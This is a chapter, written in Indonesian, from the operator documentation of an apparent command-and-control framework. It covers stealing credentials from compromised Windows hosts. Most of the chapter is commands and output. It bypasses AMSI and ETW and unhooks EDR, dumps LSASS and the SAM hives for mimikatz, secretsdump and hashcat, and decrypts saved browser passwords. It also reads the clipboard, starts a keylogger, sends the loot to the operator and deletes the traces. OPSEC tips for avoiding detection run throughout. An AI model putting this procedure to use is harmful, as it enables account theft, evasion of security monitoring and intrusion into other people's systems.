# 12 — Credential Access

## Persiapan Sebelum Credential Harvesting

Sebelum mengambil kredensial, pastikan:

```
# 1. Patch AMSI dan ETW (agar tidak terdeteksi)
bypass amsi 2703886d --wait
bypass etw 2703886d --wait

# 2. Hapus EDR hooks
evasion unhook 2703886d --wait

# 3. Cek privilege agent (banyak teknik butuh admin/SYSTEM)
cmd 2703886d "whoami /priv"
```

---

## LSASS Memory Dump

**LSASS (Local Security Authority Subsystem Service)** menyimpan credential material
di memori — termasuk NTLM hash, Kerberos tickets, dan plaintext password (pada sistem
lama atau konfigurasi tertentu).

### Dump LSASS ke File

```
taburtuai(IP:PORT) › creds lsass 2703886d --wait
```

```
[+] Dumping LSASS (PID: 724) via MiniDumpWriteDump...
[+] LSASS dump saved: C:\Windows\Temp\lsass_1714924512.dmp (84.3 MB)
[*] Download with: files download 2703886d "C:\Windows\Temp\lsass_1714924512.dmp" ./lsass.dmp
```

### Dengan Output Path Kustom

```
creds lsass 2703886d --output "C:\Users\windows\AppData\Local\Temp\sys.tmp" --wait
```

### Download dan Parse

```
# Download dump ke mesin operator
files download 2703886d "C:\Windows\Temp\lsass_1714924512.dmp" ./lsass.dmp

# Parse dengan mimikatz (di mesin operator, offline)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Atau dengan pypykatz (Linux/macOS)
pypykatz lsa minidump lsass.dmp

# Atau dengan impacket-secretsdump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### OPSEC Notes

- MiniDumpWriteDump adalah API yang sangat dimonitor oleh EDR
- Lakukan unhook NTDLL sebelum dump untuk bypass EDR hooks
- Rename file dump agar tidak obvious (`.dmp` ekstensi bisa di-flag)
- Delete file dump setelah download

---

## SAM Database Dump

**SAM (Security Account Manager)** menyimpan hash password akun lokal Windows.
Bersama SYSTEM hive, kita bisa decrypt dan mendapatkan NTLM hash semua akun lokal.

### Dump SAM, SYSTEM, dan SECURITY

```
taburtuai(IP:PORT) › creds sam 2703886d --wait
```

```
[+] Saving registry hives...
[+] SAM     → C:\Windows\Temp\sam_1714924512
[+] SYSTEM  → C:\Windows\Temp\system_1714924512
[+] SECURITY→ C:\Windows\Temp\security_1714924512
[*] Download all three files for offline cracking.
```

### Download Hive Files

```
files download 2703886d "C:\Windows\Temp\sam_1714924512" ./sam
files download 2703886d "C:\Windows\Temp\system_1714924512" ./system
files download 2703886d "C:\Windows\Temp\security_1714924512" ./security
```

### Parse Hive Files

```bash
# Dengan impacket-secretsdump (di mesin operator Linux)
impacket-secretsdump -sam sam -system system -security security LOCAL

# Output:
# [*] Target system bootKey: 0xa1b2c3d4e5f6...
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash):
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# windows:1001:aad3b435b51404eeaad3b435b51404ee:1a1dc91c907325c69271ddf0c944bc72:::

# Crack dengan hashcat
hashcat -m 1000 hashes.txt wordlist.txt
```

---

## Browser Password Harvesting

Kumpulkan saved password dari browser populer. Taburtuai mengakses encrypted credential
store browser dan decrypt menggunakan Windows DPAPI.

### Dump Browser Credentials

```
taburtuai(IP:PORT) › creds browser 2703886d --wait
```

```
[+] Harvesting browser credentials...
    Chrome : 47 credentials found
    Edge   : 23 credentials found
    Brave  : 8 credentials found
    Firefox: 12 credentials found

[+] Results:
URL                              USERNAME          PASSWORD
---------------------------------------------------------------
https://mail.company.com         john.doe          P@ssword2026
https://vpn.company.com          jdoe@company.com  SecretVPN123
https://jira.company.com         john.doe          Jira2026!
https://github.com               johndoe-dev       ghp_xxxxxxxxxxxx
...
```

### Browser yang Didukung

| Browser | Data yang Diambil |
|---|---|
| Google Chrome | Login Data, Cookies, Credit Cards |
| Microsoft Edge | Login Data, Cookies |
| Brave Browser | Login Data, Cookies |
| Mozilla Firefox | logins.json + key4.db (DPAPI) |

### Cara Kerja

- **Chromium-based** (Chrome, Edge, Brave): Decrypt menggunakan `CryptUnprotectData` Windows DPAPI dengan Local Machine key + browser-specific master key dari `Local State` file
- **Firefox**: Decrypt menggunakan Network Security Services (NSS) library dengan master password default (kosong)

---

## Clipboard Read

Ambil konten clipboard saat ini. Berguna kalau target sedang copy-paste password atau
data sensitif.

```
taburtuai(IP:PORT) › creds clipboard 2703886d --wait
```

```
[+] Clipboard content:
    Type: Text (1847 chars)
    
    Content:
    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA...
    -----END RSA PRIVATE KEY-----
```

### Kapan Berguna

- Target sedang pakai password manager → copy password ke clipboard
- Developer copy API key atau secret
- Target copy isi dokumen sensitif
- Target copy kredensial untuk paste ke terminal

### Continuous Monitoring

Untuk monitoring clipboard secara terus-menerus, kombinasi dengan keylogger:

```
# Start keylogger (rekam keyboard + clipboard)
keylog start 2703886d --duration 300  # 5 menit

# ... tunggu beberapa saat ...

# Ambil data
keylog dump 2703886d

# Stop
keylog stop 2703886d
```

---

## Scenario: Full Credential Harvest

```
# 1. Persiapan
bypass amsi 2703886d --wait
bypass etw 2703886d --wait
evasion unhook 2703886d --wait

# 2. Cek privilege
cmd 2703886d "whoami /priv"
# Pastikan ada SeDebugPrivilege

# 3. Dump LSASS
creds lsass 2703886d --wait

# 4. Dump SAM
creds sam 2703886d --wait

# 5. Browser passwords
creds browser 2703886d --wait

# 6. Clipboard (kalau user sedang aktif)
creds clipboard 2703886d --wait

# 7. Download semua hasil
files download 2703886d "C:\Windows\Temp\lsass_*.dmp" ./lsass.dmp
files download 2703886d "C:\Windows\Temp\sam_*" ./sam
files download 2703886d "C:\Windows\Temp\system_*" ./system
files download 2703886d "C:\Windows\Temp\security_*" ./security

# 8. Cleanup
cmd 2703886d "del C:\Windows\Temp\lsass_* && del C:\Windows\Temp\sam_* && del C:\Windows\Temp\system_* && del C:\Windows\Temp\security_*"
```

---

**Selanjutnya:** [13 — Reconnaissance](13-recon.md)
